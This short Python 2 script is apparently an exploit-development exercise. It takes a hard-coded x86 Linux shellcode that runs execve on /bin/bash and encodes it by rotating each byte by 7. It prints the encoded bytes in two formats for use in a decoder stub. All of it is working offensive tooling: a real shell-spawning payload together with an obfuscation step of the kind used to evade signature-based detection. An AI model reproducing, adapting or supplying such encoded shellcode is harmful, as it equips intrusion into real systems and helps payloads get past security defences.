#!/usr/bin/python

# Python ROT-7 Encoder

shellcode = ("\x31\xc0\x50\x68\x62\x61\x73\x68\x68\x62\x69\x6e\x2f\x68\x2f\x2f\x2f\x2f\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80")

encoded = ""
encoded2 = ""

print 'Encoded shellcode ...'

for x in bytearray(shellcode) :
# boundary is computed as 255-ROT(x) where x, the amount to rotate by
	if x > 248:
		encoded += '\\x'
		encoded += '%02x' %(7 -(256 - x))
		encoded2 += '0x'
		encoded2 += '%02x,' %(7 -(256 - x))
	else:
		encoded += '\\x'
		encoded += '%02x'%(x+7)
		encoded2 += '0x'
		encoded2 += '%02x,' %(x+7)
	

print encoded

print encoded2

print 'Len: %d' % len(bytearray(shellcode))

